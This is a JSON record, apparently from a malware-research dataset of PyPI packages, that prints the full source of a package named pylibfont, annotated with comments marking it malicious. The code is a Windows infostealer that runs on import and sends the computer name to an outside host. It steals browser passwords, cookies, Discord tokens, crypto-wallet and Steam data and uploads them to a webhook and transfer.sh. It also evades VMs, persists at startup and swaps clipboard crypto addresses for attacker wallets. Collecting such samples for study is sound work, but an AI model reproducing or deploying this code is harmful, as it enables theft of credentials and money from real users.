[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pylibfont-0.1.0-py3-none-any/pylibfont/__init__.py",
    "malicious_code": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Install dependencies (suspicious, but not directly malicious)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Initial exfiltration of PC username to C2\nhttpx.post(\"https://realbatman.com/\", json={\n    'embeds': [{\n        \"title\": \"Someone Tried to download\",\n        \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n    }]\n})\n\n# Malicious configuration (webhook, crypto addresses, anti-debug lists)\n__config__ = {\n    'yourwebhookurl': \"https://realbatman.com/\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qmaq4andvksy4xsj0pfjpk532wcagadv8vy0wr5',\n    'addresse_eth': '0xcDa3FA41B744af5A35050605BC0CAcB44fF134aB',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '44phaq945CMXQFBujAz9dpEX4Y9Sw5KvBf9iVq1k49cQdJEk77rneek1cPXdCxumP9SboX2xxpGZ5YM8aYecxLyP4r7dhZe',\n    'addresse_ada': 'addr1qytkh6faxr0mgx3a2eqn2q2jy2y88nvwmxscggxcaap5m7chd05n6vxlksdr64jpx5q4yg5gw0xcakdpsssd3m6rfhas25qwp6',\n    'addresse_dash': 'XqXv3CxEzYcTfT5Nx6zn7ZZpXHBnTLGJP5',\n    'blprggg': [ ... ] # anti-debug/VM/process blacklist\n}\n\n# Malicious class: clipboard crypto address stealer\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto regexes)\n        except:\n            pass\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# Malicious class: main stealer logic\nclass bc_initial_func:\n    def __init__(self):\n        # ...\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.hide = __config__[\"hide\"]\n        self.pingtype = __config__[\"pingtype\"]\n        self.pingonrun = __config__[\"ping\"]\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__[\"startup\"]\n        self.fake_error = __config__[\"fake_error\"]\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        # ...\n        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, \"Local State\"))\n        os.makedirs(self.dir, exist_ok=True)\n    def startupkekw(self):\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + argv[0]):\n                os.remove(startup_path + argv[0])\n                copy2(argv[0], startup_path)\n            else:\n                copy2(argv[0], startup_path)\n    async def bypass_tokenprtct(self):\n        tp = f\"{self.roaming}\\\\DiscordTokenProtector\\\\\"\n        if not ntpath.exists(tp):\n            return\n        config = tp + \"config.json\"\n        for i in [\"DiscordTokenProtector.exe\", \"ProtectionPayload.dll\", \"secure.dat\"]:\n            try:\n                os.remove(tp + i)\n            except FileNotFoundError:\n                pass\n        if ntpath.exists(config):\n            with open(config, errors=\"ignore\") as f:\n                try:\n                    item = json.load(f)\n                except json.decoder.JSONDecodeError:\n                    return\n                item['kekw_is_here'] = \"https://kekwltd.ru\"\n                item['auto_start'] = False\n                item['auto_start_discord'] = False\n                item['integrity'] = False\n                item['integrity_allowbetterdiscord'] = False\n                item['integrity_checkexecutable'] = False\n                item['integrity_checkhash'] = False\n                item['integrity_checkmodule'] = False\n                item['integrity_checkscripts'] = False\n                item['integrity_checkresource'] = False\n                item['integrity_redownloadhashes'] = False\n                item['iterations_iv'] = 364\n                item['iterations_key'] = 457\n                item['version'] = 69420\n            with open(config, 'w') as f:\n                json.dump(item, f, indent=2, sort_keys=True)\n            with open(config, 'a') as f:\n                f.write(\"\\n\\n//KEKWLTD | https://kekwltd.ru\")\n    async def kill_process_id(self):\n        bllist = __config__['blprggg']\n        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:\n            bllist.append(i)\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in bllist):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    async def bypass_bttdsc(self):\n        bd = self.roaming + \"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        if ntpath.exists(bd):\n            x = self.regex_webhook_dsc\n            with open(bd, 'r', encoding=\"cp437\", errors='ignore') as f:\n                txt = f.read()\n                content = txt.replace(x, 'kekwltd')\n            with open(bd, 'w', newline='', encoding=\"cp437\", errors='ignore') as f:\n                f.write(content)\n    def steal_token(self):\n        # Steals Discord tokens from various browsers and verifies them\n        # ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for filname in os.listdir(path):\n                        if filname[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl, headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                    pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.bc_id:\n                                        self.tokens.append(token)\n                                        self.bc_id.append(uid)\n            else:\n                for filname in os.listdir(path):\n                    if filname[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.bc_id:\n                                    self.tokens.append(token)\n                                    self.bc_id.append(uid)\n        # ...\n    def natify_matched_tokens(self):\n        # Exfiltrates found Discord tokens and user info to webhook\n        f = open(self.dir + \"\\\\Discord_Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        for token in self.tokens:\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\n            # ...\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nBilling?: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nPhone: {phone}\\nToken: {token}\\nEmail: {email}\\n\\n\")\n        f.close()\n    def finished_bc(self):\n        # Zips all stolen data and exfiltrates to webhook\n        for i in os.listdir(self.dir):\n            if i.endswith('.txt'):\n                path = self.dir + self.sep + i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        ff.close()\n                        os.remove(path)\n                    else:\n                        with open(path, \"w\", encoding=\"utf-8\", errors=\"ignore\") as f:\n                            f.write(\"KEKWLTD | https://kekwltd.ru\\n\\n\")\n                        with open(path, \"a\", encoding=\"utf-8\", errors=\"ignore\") as fp:\n                            fp.write(x + \"\\n\\nKEKWLTD | https://kekwltd.ru\")\n        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        # ...\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# Malicious anti-debug/VM detection\nclass NoDebugg:\n    inVM = False\n    def __init__(self):\n        self.processes = list()\n        self.bluseurs = [ ... ]\n        self.blpcname = [ ... ]\n        self.blhwid = [ ... ]\n        self.blips = [ ... ]\n        for func in [self.lstchec, self.regkey, self.sp3cCheq]:\n            process = threading.Thread(target=func, daemon=True)\n            self.processes.append(process)\n            process.start()\n        for t in self.processes:\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n    def programExit(self):\n        self.__class__.inVM = True\n    def lstchec(self):\n        for path in [r'D:\\Tools', r'D:\\OS2', r'D:\\NT3X']:\n            if ntpath.exists(path):\n                self.programExit()\n        for user in self.bluseurs:\n            if infocom == user:\n                self.programExit()\n        for pcName in self.blpcname:\n            if vctm_pc == pcName:\n                self.programExit()\n        for pcIP in self.blips:\n            if self.net_1fo()[0] == pcIP:\n                self.programExit()\n        for uuidwndz in self.blhwid:\n            if self.sys_1fo()[0] == uuidwndz:\n                self.programExit()\n    def sp3cCheq(self):\n        if int(r4m) <= 3: \n            self.programExit()\n        if int(d1sk) <= 120:  \n            self.programExit()\n        if int(psutil.cpu_count()) <= 1:\n            self.programExit()\n    def regkey(self):\n        reg1 = os.system(\"REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\DriverDesc 2> nul\")\n        reg2 = os.system(\"REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\ProviderName 2> nul\")\n        if (reg1 and reg2) != 1:\n            self.programExit()\n        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum')\n        try:\n            reg_val = winreg.QueryValueEx(handle, '0')[0]\n            if (\"VMware\" or \"VBOX\") in reg_val:\n                self.programExit()\n        finally:\n            winreg.CloseKey(handle)\n\n# Malicious main execution\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bc_initial_func().init())\n\n# --- SECONDARY STEALER/EXFIL CODE ---\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\ndef fetch_conf(e: str) -> str or bool | None:\n        return __config__.get(e)\nhook = fetch_conf(\"yourwebhookurl\")\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode, url, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\",listt)\n    while \"https\" in e: e.remove(\"https\")\n    while \"com\" in e: e.remove(\"com\")\n    while \"net\" in e: e.remove(\"net\")\n    return list(set(e))\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    if \"bc_allpasswords\" in name:\n        ra = ' | '.join(da for da in paswWords)\n        if len(ra) > 1000:\n            rrr = Reformat(str(paswWords))\n            ra = ' | '.join(da for da in rrr)\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Passwords Found:\",\n                \"value\": ra\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\",\n            },\n            'color': 374276,\n            }\n        ],\n         \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n    if \"bc_allcookies\" in name:\n        rb = ' | '.join(da for da in cookiWords)\n        if len(rb) > 1000:\n            rrrrr = Reformat(str(cookiWords))\n            rb = ' | '.join(da for da in rrrrr)\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Cookies Found:\",\n                \"value\": rb\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\",\n            },\n            'color': 374276,\n            }\n        ],\n         \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n    LoadRequests(\"POST\", hook, files=files)\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\{name}.txt\"\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(f\"KEKWLTD | https://kekwltd.ru\\n\\n\")\n        for line in data:\n            if line[0] != '':\n                f.write(f\"{line}\\n\")\nPassw = []\ndef getPassw(path, arg):\n    global Passw\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords: paswWords.append(old)\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\n    writeforfile(Passw, 'bc_allpasswords')\nCookies = []\ndef getCookie(path, arg):\n    global Cookies\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords: cookiWords.append(old)\n            Cookies.append(f\"{row[0]}\\tTRUE\"+\"\\t\\t\"+ f\"/FALSE\\t2597573456\\t{row[1]}\\t{DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies, 'bc_allcookies')\ndef checkIfProcessRunning(processName):\n    for proc in psutil.process_iter():\n        try:\n            if processName.lower() in proc.name().lower():\n                return True\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n    return False;\ndef ZipThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"aholpfdialjgjfhomihkjbmgjidlcdno\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Exodus_{browser}\"\n        pathC = path + arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC): return\n    if checkIfProcessRunning('chrome.exe'):\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef grabb_GatherAll():\n    browserPaths = [ ... ]\n    Paths_zipped = [ ... ]\n    for patt in browserPaths:\n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\nbc_create_files = []\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [ ... ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\ngrabb_GatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()"
  }
]